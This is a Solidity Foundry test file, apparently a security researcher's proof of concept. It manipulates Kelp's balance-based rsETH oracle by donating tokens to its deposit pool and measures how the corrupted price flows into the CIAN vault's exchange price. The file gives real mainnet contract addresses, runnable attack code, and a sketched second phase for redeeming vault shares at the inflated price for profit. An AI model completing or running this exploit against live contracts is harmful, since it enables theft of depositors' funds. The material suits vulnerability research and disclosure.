// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*//////////////////////////////////////////////////////////////
    POC: Kelp rsETH oracle (balanceOf-based) manipulation
         -> propagates into CIAN ylrsETH Vault's exchangePrice
         via leveraged strategy debt conversion
         -> measures whether it is net-profitable to redeem at
         the corrupted price, net of donation cost.

    HOW TO RUN:
      forge install foundry-rs/forge-std
      forge install OpenZeppelin/openzeppelin-contracts
      forge test --match-contract CianKelpOracleTest -vvvv \
        --fork-url <YOUR_MAINNET_RPC_URL>

    This is READ/SIMULATE-ONLY in its first version (Phase 1):
    it does NOT attempt the full requestRedeem/confirmWithdrawal
    loop yet, because that requires impersonating RedeemOperator's
    `operator` role whose real address we have not confirmed
    on-chain. Phase 1 proves/disproves the *first half* of the
    chain (does donating to Kelp move CIAN's computed TVL at all,
    and by how much, within Kelp's pricePercentageLimit guard).
    Phase 2 (commented at the bottom) extends to the full
    redeem-at-corrupted-price flow once you confirm the operator
    address (see NOTE at the bottom).
//////////////////////////////////////////////////////////////*/

// ---- Minimal interfaces (only what we need) ----

interface IKelpOracle {
    function rsETHPrice() external view returns (uint256);
    function highestRsethPrice() external view returns (uint256);
    function pricePercentageLimit() external view returns (uint256);
    function updateRSETHPrice() external;
}

interface IKelpDepositPool {
    function getTotalAssetDeposits(address asset) external view returns (uint256);
}

interface ICianVault {
    function exchangePrice() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function underlyingTvl() external returns (uint256); // non-view in source (calls totalStrategiesAssets)
    function updateExchangePrice() external returns (uint256 newExchangePrice, uint256 newRevenue);
    function getVaultParams() external view returns (
        string memory name,
        string memory symbol,
        address underlyingToken,
        address admin,
        address rebalancer,
        address feeReceiver,
        address redeemOperator,
        uint256 marketCapacity,
        uint256 managementFeeRate,
        uint256 managementFeeClaimPeriod,
        uint256 maxPriceUpdatePeriod,
        uint256 revenueRate,
        uint256 exitFeeRate
    );
}

interface ICianStrategy {
    function getNetAssets() external returns (uint256);
}

contract CianKelpOracleTest is Test {
    // ---- CIAN addresses (confirmed from uploaded source / on-chain reads) ----
    address constant CIAN_VAULT = 0xd87a19fF681AE98BF10d2220D1AE3Fbd374ADE4e;
    address constant CIAN_MANAGER = 0xAc1894C6914639e18f8FA69FEBd324eE91c96065; // rebalancer
    address constant STRATEGY_AAVEV3 = 0x21625ffc879de0ba9fc3206f9d9edfe74c4b0a71;
    address constant STRATEGY_COMPOUND = 0xB69ca6D2Fb435318800F267DD217d64Fa4BE137e;
    address constant D_WETH_AAVEV3 = 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE; // Aave variable debt WETH

    // ---- Kelp addresses (hardcoded constants found inside CIAN's own source) ----
    address constant KELP_DEPOSIT_POOL = 0x036676389e48133B63a802f8635AD39E752D375D;
    address constant KELP_ORACLE = 0x349A73444b1a310BAe67ef67973022020d70020d;

    // ---- Kelp supported assets (used by CIAN) ----
    address constant RSETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address constant ETHx = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;
    address constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    address attacker = makeAddr("attacker");

    function setUp() public {
        // Nothing to do here - each test forks fresh via --fork-url + forge's
        // automatic fork at the block implied by the RPC's latest state,
        // unless you pin a block with --fork-block-number.
    }

    /// @notice Phase 1: measure how much a pure "donation" to Kelp's
    /// LRTDepositPool moves (a) Kelp's own rsETHPrice and (b) CIAN's
    /// computed underlyingTvl()/exchangePrice(), and whether Kelp's
    /// pricePercentageLimit circuit breaker blocks it.
    function testDonationImpactOnCianTvl() public {
        // ---------- BASELINE (before any manipulation) ----------
        uint256 kelpPriceBefore = IKelpOracle(KELP_ORACLE).rsETHPrice();
        uint256 highestBefore = IKelpOracle(KELP_ORACLE).highestRsethPrice();
        uint256 pctLimit = IKelpOracle(KELP_ORACLE).pricePercentageLimit();

        console2.log("=== BASELINE ===");
        console2.log("Kelp rsETHPrice        :", kelpPriceBefore);
        console2.log("Kelp highestRsethPrice :", highestBefore);
        console2.log("Kelp pricePercentageLimit (1e18=100%%) :", pctLimit);

        uint256 vaultExchangePriceBefore = ICianVault(CIAN_VAULT).exchangePrice();
        console2.log("CIAN exchangePrice (cached, pre-update):", vaultExchangePriceBefore);

        // Strategy debt (what we expect the attack to amplify through)
        uint256 debtBefore = IERC20(D_WETH_AAVEV3).balanceOf(STRATEGY_AAVEV3);
        console2.log("StrategyAAVEV3 WETH debt balance:", debtBefore);

        // ---------- STEP 1: ATTACKER DONATES ETHx DIRECTLY TO KELP'S POOL ----------
        // No function call needed on Kelp's side - a plain ERC20 transfer
        // inflates `assetLyingInDepositPool = IERC20(asset).balanceOf(address(this))`
        // inside LRTDepositPool.getAssetDistributionData().
        //
        // Donation size: start with a modest amount and let the
        // pricePercentageLimit decide how far it actually moves things.
        // Tune DONATE_AMOUNT and re-run to find the real-world bound.
        uint256 DONATE_AMOUNT = 500 ether; // 500 ETHx - adjust and re-run

        deal(ETHx, attacker, DONATE_AMOUNT, true);
        vm.prank(attacker);
        IERC20(ETHx).transfer(KELP_DEPOSIT_POOL, DONATE_AMOUNT);

        console2.log("=== AFTER DONATION of", DONATE_AMOUNT, "ETHx to LRTDepositPool ===");

        // ---------- STEP 2: TRIGGER (PERMISSIONLESS) PRICE UPDATE ----------
        // updateRSETHPrice() is public with NO access control in the
        // version we reviewed. If the jump exceeds pricePercentageLimit
        // this call reverts for a non-MANAGER caller - that revert IS
        // itself a meaningful result (tells us the circuit breaker works).
        vm.prank(attacker);
        try IKelpOracle(KELP_ORACLE).updateRSETHPrice() {
            console2.log("updateRSETHPrice() succeeded (no revert)");
        } catch Error(string memory reason) {
            console2.log("updateRSETHPrice() REVERTED with reason:", reason);
        } catch (bytes memory lowLevelData) {
            console2.logBytes(lowLevelData);
            console2.log("updateRSETHPrice() REVERTED (custom error / low-level)");
        }

        uint256 kelpPriceAfter = IKelpOracle(KELP_ORACLE).rsETHPrice();
        console2.log("Kelp rsETHPrice after attempt:", kelpPriceAfter);
        console2.log(
            "Kelp price delta (bps of previous):",
            kelpPriceBefore == 0
                ? 0
                : ((kelpPriceAfter > kelpPriceBefore ? kelpPriceAfter - kelpPriceBefore : kelpPriceBefore - kelpPriceAfter) * 10000) / kelpPriceBefore
        );

        // ---------- STEP 3: PROPAGATE INTO CIAN'S TVL CALCULATION ----------
        // getNetAssets() on the strategy is NOT access-controlled (view/
        // external, called internally by totalStrategiesAssets()), so we
        // can read the corrupted computed value directly without needing
        // the rebalancer role.
        uint256 netAssetsAfter = ICianStrategy(STRATEGY_AAVEV3).getNetAssets();
        console2.log("StrategyAAVEV3.getNetAssets() after manipulation:", netAssetsAfter);

        // ---------- STEP 4: SIMULATE THE REBALANCER CALLING updateExchangePrice() ----------
        // We impersonate the Manager contract address directly (it IS the
        // configured `rebalancer`), bypassing Manager.multiCall's own
        // operator whitelist - this simulates "what happens on the NEXT
        // routine rebalance", which is realistic since rebalances happen
        // periodically regardless of the attacker's actions.
        vm.prank(CIAN_MANAGER);
        try ICianVault(CIAN_VAULT).updateExchangePrice() returns (uint256 newPrice, uint256 newRevenue) {
            console2.log("=== updateExchangePrice() SUCCEEDED ===");
            console2.log("New exchangePrice:", newPrice);
            console2.log("New revenue      :", newRevenue);
            console2.log("Delta vs baseline (can be negative - check sign manually):");
            if (newPrice > vaultExchangePriceBefore) {
                console2.log("  +", newPrice - vaultExchangePriceBefore);
            } else {
                console2.log("  -", vaultExchangePriceBefore - newPrice);
            }
        } catch Error(string memory reason) {
            console2.log("updateExchangePrice() REVERTED with reason:", reason);
        } catch (bytes memory lowLevelData) {
            console2.logBytes(lowLevelData);
            console2.log("updateExchangePrice() REVERTED (custom error / low-level)");
        }

        // ---------- RESULT SUMMARY ----------
        console2.log("=== SUMMARY ===");
        console2.log("Donation cost (ETHx, NOT recovered in this phase):", DONATE_AMOUNT);
        console2.log(
            "If exchangePrice moved up meaningfully AND updateExchangePrice() did not revert,"
        );
        console2.log(
            "the next step (Phase 2) is to size a requestRedeem() position and measure"
        );
        console2.log("whether the extra payout exceeds the donation cost.");
    }

    /*//////////////////////////////////////////////////////////////
        PHASE 2 (sketch - fill in once you confirm RedeemOperator's
        `operator` address on-chain, e.g. via Etherscan "Read Contract"
        on 0x47dbd71db64617f6cbd45eb9d9ba876f40ed239e -> operator()):

        1. Have `attacker` acquire some CIAN_VAULT shares beforehand
           (e.g. via a legitimate deposit at the pre-manipulation price,
           or deal() the share token directly for a pure "what-if" test).
        2. vm.prank(attacker); IERC20(CIAN_VAULT).approve(REDEEM_OPERATOR, shares);
           vm.prank(attacker); IVault(CIAN_VAULT).requestRedeem(shares, RSETH);
        3. Run the donation + updateRSETHPrice() + updateExchangePrice()
           sequence above (Manager must call updateExchangePrice() and
           RedeemOperator.confirmWithdrawal() in the SAME transaction,
           because confirmWithdrawal() requires Vault.lastExchangePrice()
           != 0, which is EIP-1153 transient storage only valid within
           the tx that called updateExchangePrice()). You'll need to
           impersonate the real `operator` address for this step.
        4. Record attacker's RSETH balance before/after confirmWithdrawal()
           and compare the payout against `shares`' fair (pre-manipulation)
           value plus the DONATE_AMOUNT cost. That delta is the real,
           quantified profit (or loss) figure for the report.
    //////////////////////////////////////////////////////////////*/
}
